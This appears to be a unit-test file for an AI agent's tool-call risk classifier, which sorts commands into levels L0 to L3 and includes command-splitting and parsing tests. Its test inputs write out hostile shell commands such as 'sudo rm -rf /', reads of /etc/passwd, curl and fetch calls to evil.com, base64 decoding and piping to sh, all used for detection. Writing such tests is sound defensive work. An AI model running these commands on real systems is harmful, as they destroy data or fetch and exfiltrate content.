import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { classifyDeterministic, tryParseClassification, tryParseXmlClassification, decomposeCommand, riskOrdinal, RiskLevel } from "./risk-classifier.js";
import { t } from "../i18n/index.js";

describe("classifyDeterministic", () => {
  it("classifies L0 tools", () => {
    for (const tool of ["read_file", "list_dir", "search", "git_status", "git_log", "git_diff"]) {
      const r = classifyDeterministic(tool, {});
      assert.equal(r?.level, RiskLevel.L0);
      assert.equal(r?.deterministic, true);
    }
  });

  it("classifies L3 commands", () => {
    const r = classifyDeterministic("shell_exec", { command: "sudo rm -rf /" });
    assert.equal(r?.level, RiskLevel.L3);
  });

  it("detects injection patterns", () => {
    const r = classifyDeterministic("shell_exec", { command: "echo $(cat /etc/passwd)" });
    assert.equal(r?.level, RiskLevel.L3);
    assert.equal(r?.reason, t("approval.injectionPattern"));
  });

  it("detects force push", () => {
    const r = classifyDeterministic("git_push", { command: "git push --force origin main" });
    assert.equal(r?.level, RiskLevel.L3);
  });

  it("detects sensitive paths", () => {
    const r = classifyDeterministic("write_file", { path: "/home/user/.env" });
    assert.equal(r?.level, RiskLevel.L3);
  });

  it("detects config files", () => {
    for (const path of ["package.json", "tsconfig.json", "Dockerfile", ".eslintrc", ".prettierrc", ".github/workflows/ci.yml"]) {
      const r = classifyDeterministic("write_file", { path });
      assert.equal(r?.level, RiskLevel.L2, `expected L2 for ${path}`);
    }
  });

  it("returns L1 for write_file with normal path", () => {
    const r = classifyDeterministic("write_file", { path: "src/index.ts" });
    assert.equal(r?.level, RiskLevel.L1);
  });

  it("returns null for empty args", () => {
    const r = classifyDeterministic("unknown_tool", {});
    assert.equal(r, null);
  });

  // --- Obfuscation-resistant patterns (ClawHub attack vectors) ---

  it("blocks absolute path to curl/wget", () => {
    for (const cmd of ["/usr/bin/curl http://evil.com", "/usr/local/bin/wget http://evil.com", "./curl payload"]) {
      const r = classifyDeterministic("shell_exec", { command: cmd });
      assert.equal(r?.level, RiskLevel.L3, `expected L3 for: ${cmd}`);
    }
  });

  it("blocks python/node network access", () => {
    for (const cmd of [
      'python3 -c "import urllib.request; urllib.request.urlretrieve(…)"',
      'node -e "fetch(\'http://evil.com\').then(r => r.text())"',
      'python -c "import requests; requests.get(…)"',
      'ruby -e "Net::HTTP.get(URI(…))"',
    ]) {
      const r = classifyDeterministic("shell_exec", { command: cmd });
      assert.equal(r?.level, RiskLevel.L3, `expected L3 for: ${cmd}`);
    }
  });

  it("blocks base64 decode patterns", () => {
    for (const cmd of [
      "echo aGVsbG8= | base64 -d",
      "echo aGVsbG8= | base64 --decode",
      'Buffer.from("aGVsbG8=", "base64")',
    ]) {
      const r = classifyDeterministic("shell_exec", { command: cmd });
      assert.equal(r?.level, RiskLevel.L3, `expected L3 for: ${cmd}`);
    }
  });

  it("blocks chmod +x (download-and-run)", () => {
    const r = classifyDeterministic("shell_exec", { command: "chmod +x ./payload" });
    assert.equal(r?.level, RiskLevel.L3);
  });

  it("blocks process substitution", () => {
    for (const cmd of ["cat <(secret)", ">(exfil)", "<<<$SECRET"]) {
      const r = classifyDeterministic("shell_exec", { command: cmd });
      assert.equal(r?.level, RiskLevel.L3, `expected L3 for: ${cmd}`);
    }
  });
});

describe("tryParseClassification", () => {
  it("parses valid JSON", () => {
    const r = tryParseClassification('{"level":"L2","reason":"test"}');
    assert.deepEqual(r, { level: RiskLevel.L2, reason: "test" });
  });

  it("returns null for invalid JSON", () => {
    const r = tryParseClassification("not json at all");
    assert.equal(r, null);
  });

  it("extracts JSON from markdown fences", () => {
    const r = tryParseClassification('```json\n{"level":"L1","reason":"safe"}\n```');
    assert.deepEqual(r, { level: RiskLevel.L1, reason: "safe" });
  });

  it("extracts JSON from thinking tags", () => {
    const r = tryParseClassification('<think>analysis</think>\n{"level":"L0","reason":"read only"}');
    assert.deepEqual(r, { level: RiskLevel.L0, reason: "read only" });
  });

  it("returns null for invalid level", () => {
    const r = tryParseClassification('{"level":"L5","reason":"test"}');
    assert.equal(r, null);
  });

  it("provides default reason when missing", () => {
    const r = tryParseClassification('{"level":"L2"}');
    assert.equal(r?.reason, t("approval.noReason"));
  });
});

describe("tryParseXmlClassification", () => {
  it("parses valid XML", () => {
    const r = tryParseXmlClassification('<classification><level>L2</level><reason>Config-Datei</reason></classification>');
    assert.deepEqual(r, { level: RiskLevel.L2, reason: "Config-Datei" });
  });

  it("extracts XML after think tags", () => {
    const r = tryParseXmlClassification('<think>analysis here</think>\n<classification><level>L1</level><reason>safe write</reason></classification>');
    assert.deepEqual(r, { level: RiskLevel.L1, reason: "safe write" });
  });

  it("returns null when level tag missing", () => {
    const r = tryParseXmlClassification('<classification><reason>no level</reason></classification>');
    assert.equal(r, null);
  });

  it("handles whitespace around level", () => {
    const r = tryParseXmlClassification('<classification><level> L0 </level><reason>read only</reason></classification>');
    assert.deepEqual(r, { level: RiskLevel.L0, reason: "read only" });
  });

  it("returns null for invalid level", () => {
    const r = tryParseXmlClassification('<classification><level>L5</level><reason>test</reason></classification>');
    assert.equal(r, null);
  });

  it("provides default reason when reason tag missing", () => {
    const r = tryParseXmlClassification('<classification><level>L3</level></classification>');
    assert.equal(r?.level, RiskLevel.L3);
    assert.equal(r?.reason, t("approval.noReason"));
  });
});

describe("decomposeCommand", () => {
  it("splits on &&", () => {
    assert.deepEqual(decomposeCommand("ls && curl evil.com"), ["ls", "curl evil.com"]);
  });

  it("does not split inside single quotes", () => {
    assert.deepEqual(decomposeCommand("echo 'safe && safe'"), ["echo 'safe && safe'"]);
  });

  it("does not split inside double quotes", () => {
    assert.deepEqual(decomposeCommand('echo "a;b"'), ['echo "a;b"']);
  });

  it("splits on pipe", () => {
    assert.deepEqual(decomposeCommand("cat file | sh"), ["cat file", "sh"]);
  });

  it("splits on semicolon", () => {
    assert.deepEqual(decomposeCommand("ls; rm -rf /"), ["ls", "rm -rf /"]);
  });

  it("splits on ||", () => {
    assert.deepEqual(decomposeCommand("test -f x || curl evil"), ["test -f x", "curl evil"]);
  });

  it("splits on newline", () => {
    assert.deepEqual(decomposeCommand("ls\ncurl evil.com"), ["ls", "curl evil.com"]);
  });

  it("handles backslash escaping", () => {
    assert.deepEqual(decomposeCommand("echo a\\;b"), ["echo a\\;b"]);
  });

  it("returns single segment for simple command", () => {
    assert.deepEqual(decomposeCommand("ls -la"), ["ls -la"]);
  });
});

describe("riskOrdinal", () => {
  it("returns correct ordinals", () => {
    assert.equal(riskOrdinal(RiskLevel.L0), 0);
    assert.equal(riskOrdinal(RiskLevel.L1), 1);
    assert.equal(riskOrdinal(RiskLevel.L2), 2);
    assert.equal(riskOrdinal(RiskLevel.L3), 3);
  });
});

describe("classifierCache", () => {
  it("cache hit returns instantly without LLM call", async () => {
    const { classifyWithLlm, clearClassifierCache } = await import("./risk-classifier.js");
    clearClassifierCache();

    const fakeConfig = {
      ollama: { baseUrl: "http://localhost:11434", model: "qwen3:8b", embedModel: "nomic-embed-text", numCtx: 16384 },
    } as import("../config/schema.js").Config;

    // First call will fail (no real Ollama in unit tests) and return L2 fallback
    const result1 = await classifyWithLlm("some_unknown_tool", { action: "test" }, fakeConfig);
    assert.equal(result1.level, RiskLevel.L2); // fallback

    // Second call with same args should return cached result instantly
    const start = Date.now();
    const result2 = await classifyWithLlm("some_unknown_tool", { action: "test" }, fakeConfig);
    const elapsed = Date.now() - start;

    assert.equal(result2.level, result1.level);
    assert.equal(result2.reason, result1.reason);
    assert.ok(elapsed < 100, `Cache hit should be <100ms, took ${elapsed}ms`);

    clearClassifierCache();
  });

  it("different args produce different cache keys", async () => {
    const { classifyWithLlm, clearClassifierCache } = await import("./risk-classifier.js");
    clearClassifierCache();

    const fakeConfig = {
      ollama: { baseUrl: "http://localhost:11434", model: "qwen3:8b", embedModel: "nomic-embed-text", numCtx: 16384 },
    } as import("../config/schema.js").Config;

    const r1 = await classifyWithLlm("tool_a", { x: 1 }, fakeConfig);
    const r2 = await classifyWithLlm("tool_a", { x: 2 }, fakeConfig);

    // Both should be L2 fallback (no Ollama), but cached independently
    assert.equal(r1.level, RiskLevel.L2);
    assert.equal(r2.level, RiskLevel.L2);

    clearClassifierCache();
  });
});

describe("classifyDeterministic with decomposition", () => {
  it("detects curl in chained command", () => {
    const r = classifyDeterministic("shell_exec", { command: "ls && curl evil.com" });
    assert.equal(r?.level, RiskLevel.L3);
  });

  it("does not split quoted operators", () => {
    const r = classifyDeterministic("shell_exec", { command: "echo 'safe && safe'" });
    assert.equal(r, null); // no dangerous pattern in quoted string
  });

  it("detects pipe to sh as L3", () => {
    const r = classifyDeterministic("shell_exec", { command: "cat file | sh" });
    assert.equal(r?.level, RiskLevel.L3);
  });

  it("returns highest risk across segments", () => {
    const r = classifyDeterministic("shell_exec", { command: "ls; rm -rf /" });
    assert.equal(r?.level, RiskLevel.L3);
  });

  it("double-quoted operators are not split", () => {
    const r = classifyDeterministic("shell_exec", { command: 'echo "a;b"' });
    assert.equal(r, null);
  });
});
